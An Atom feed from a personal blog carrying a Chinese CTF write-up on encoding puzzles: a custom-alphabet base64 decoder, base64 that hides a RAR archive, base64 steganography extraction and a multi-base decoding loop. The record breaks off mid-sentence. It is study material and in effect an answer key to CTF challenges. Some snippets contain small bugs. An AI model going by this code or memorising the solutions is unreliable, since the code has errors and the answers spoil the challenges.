<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://s1eady.top/atom.xml" rel="self"/>
  
  <link href="http://s1eady.top/"/>
  <updated>2020-11-06T11:26:55.272Z</updated>
  <id>http://s1eady.top/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF-Crypto刷题1</title>
    <link href="http://s1eady.top/2021/02/13/CTF-Crypto%E5%88%B7%E9%A2%982/"/>
    <id>http://s1eady.top/2021/02/13/CTF-Crypto%E5%88%B7%E9%A2%982/</id>
    <published>2021-02-12T19:19:44.000Z</published>
    <updated>2020-11-06T11:26:55.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-密码题"><a href="#CTF-密码题" class="headerlink" title="CTF-密码题"></a>CTF-密码题</h1><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><h3 id="this-base64"><a href="#this-base64" class="headerlink" title="this base64?"></a>this base64?</h3><p>给了一个新的编码表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">码表：</span><br><span class="line"><span class="string">&#x27;JKLMNOxyUVzABCDEFGH789PQIabcdefghijklmWXYZ0123456RSTnopqrstuvw+/=&#x27;</span></span><br><span class="line">chipertext:</span><br><span class="line">FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">dict=&#123;<span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>,<span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span>&#125;</span><br><span class="line">base64_list = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]</span><br><span class="line">cipher=<span class="string">&#x27;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span>(dict[j]==cipher[i]):</span><br><span class="line">            res+=base64_list[j]</span><br><span class="line">flag=base64.b64decode(res)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="base一条龙"><a href="#base一条龙" class="headerlink" title="base一条龙"></a>base一条龙</h3><p>给了一串base64，解密给出一堆乱码但是开头是RAR，直接写入文件。打开压缩包拿到一堆base64。尝试base64隐写，拿到一个网站，下载一个压缩包。得到一串类似base64的东西，接着尝试各种base密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">&#x27;flag.rar&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(str(base64.b64decode(steady_str)))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;Rar!\x1a\x07\x01\x00\xf3\xe1\x82\xeb\x0b\x01\x05\x07\x00\x06\x01\x01\x80\x80\x80\x00\x98\xa2;A&amp;\x02\x03\x0b\xbd\x92\x00\x04\xf8\xe4\x00 I\xf8\xd1C\x80\x03\x00\x08steg.txt\n\x03\x02U\xe2\xb9w\xa0\xf3\xd5\x01\xcc\xa69\t@\x04344?5\x04^\xf3\xe5_\ri\xa4\xb5\xeb\xe1\xbcr\xb2b\x94\xaa\xb3\x15VR\x89L]&amp;\xe6\xd4M\xea\xce\x92\xb7\xc3\xfe\xda\xf0\xcc@\x12&lt;\x08M\xb9RMo\xe3\x99x\x91$\x01`\x0b\x00/\x9a\x00\x80@6\r\x8f\x1b\xbb\x00]\x12\t\xf9.\x1d\xfc~_9\xbfx\xbf\x8f\xdb\xfa\x92\xca\xbe\xd2p\xe5;\xb5\xdb\xdfE\xe3\xc3\x7f\x8f_\x8f\x0b\xbe\xd2Q6\xcf\x1e\xce\x9el\xbb\xa2\xf1\xa6\xac*\xdbl\xd9x\xc0\xcao\xde\xd2\xf7h\xc0W||\xb9\xed?\xdc\xfd\x9f\x1f\x8f\xe8\xeeHlC\xf4\xa7S[\x99\x03\xa9\xc0xq-|1;\x0b\xb9\xc9`C\xa1\xdao6&lt;N\x02\x99\xc7\x93%\xed(xzph\xac\x90\x1d\xfb\xb1\x9a5\xecw\xa7\x18\xcd0u\x03\x11D\xd3\xab^\xbb\x89`\xc0\xee\xc3\x03\xa1\xe5\xb0y1\xde\xdde\xd4r7\x07v\xcc\x85\x84\xb2\x03\xf7\</span></span><br></pre></td></tr></table></figure><p>拿到RAR</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">steady_str=<span class="string">&quot;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&quot;</span></span><br><span class="line">f=open(<span class="string">&#x27;flag.rar&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="comment">#注意这里是以二进制的形式打开文件，才能够写入文件。</span></span><br><span class="line">f.write(str(base64.b64decode(steady_str)))</span><br></pre></td></tr></table></figure><p>base64隐写解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;steg.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.lanzous.com&#x2F;i9zuwhi base16&#x2F;32&#x2F;58&#x2F;64&#x2F;85&#x2F;91&#x2F;92</span><br></pre></td></tr></table></figure><p>访问下载文件。尝试不同的base解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> base91</span><br><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"><span class="keyword">import</span> py3base92</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str</span>(<span class="params">s</span>):</span></span><br><span class="line">        k=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">2</span>):</span><br><span class="line">                j = s[i]+s[i+<span class="number">1</span>]</span><br><span class="line">                k+=chr(int(j,<span class="number">16</span>))</span><br><span class="line">        print(<span class="string">&#x27;16&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ba32</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base64.b32decode(s)</span><br><span class="line">        s = bytes.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ba58</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base58.b58decode(s)</span><br><span class="line">        s = bytes.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;58&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ba64</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base64.b64decode(s)</span><br><span class="line">        s = bytes.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baa85</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base64.a85decode(s)</span><br><span class="line">        s = bytes.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;a85&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bab85</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base64.b85decode(s)</span><br><span class="line">        s = bytes.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;b85&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ba91</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base91.decode(s)</span><br><span class="line">        s = s.decode()</span><br><span class="line">        print(<span class="string">&#x27;91&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ba92</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = py3base92.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;91&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">s</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">                <span class="keyword">if</span> len(s)&lt;<span class="number">50</span>:</span><br><span class="line">                        print(s)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                        s=hex_to_str(s)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                                s=ba32(s)</span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                                <span class="keyword">try</span>:</span><br><span class="line">                                        s=ba58(s)</span><br><span class="line">                                <span class="keyword">except</span>:</span><br><span class="line">                                        <span class="keyword">try</span>:</span><br><span class="line">                                                s=ba64(s)</span><br><span class="line">                                        <span class="keyword">except</span>:</span><br><span class="line">                                                <span class="keyword">try</span>:</span><br><span class="line">                                                        s = baa85(s)</span><br><span class="line">                                                <span class="keyword">except</span>:</span><br><span class="line">                                                        <span class="keyword">try</span>:</span><br><span class="line">                                                                s=bab85(s)</span><br><span class="line">                                                        <span class="keyword">except</span>:</span><br><span class="line">                                                                <span class="keyword">try</span>:</span><br><span class="line">                                                                        s = ba92(s)</span><br><span class="line">                                                                <span class="keyword">except</span>:</span><br><span class="line">                                                                        <span class="keyword">try</span>:</span><br><span class="line">                                                                                s=ba91(s)</span><br><span class="line">                                                                        <span class="keyword">except</span>:</span><br><span class="line">                                                                                print(<span class="string">&#x27;nonono&#x27;</span>)</span><br><span class="line">                                                                                </span><br><span class="line"><span class="keyword">if</span>  __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        f = open(<span class="string">&#x27;steg.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        s = f.read()</span><br><span class="line">        start(s)</span><br></pre></td></tr></table></figure><p>当出现的值为TkVLTFdUQVpvUlNda1ZXRUpAZVldTltgJCQhLCAgGSknPjc=时base64解码出现乱码。这应该是解密到最后的文件。终于发现原来需要异或。</p><figure class="highlight python"><table><tr><td 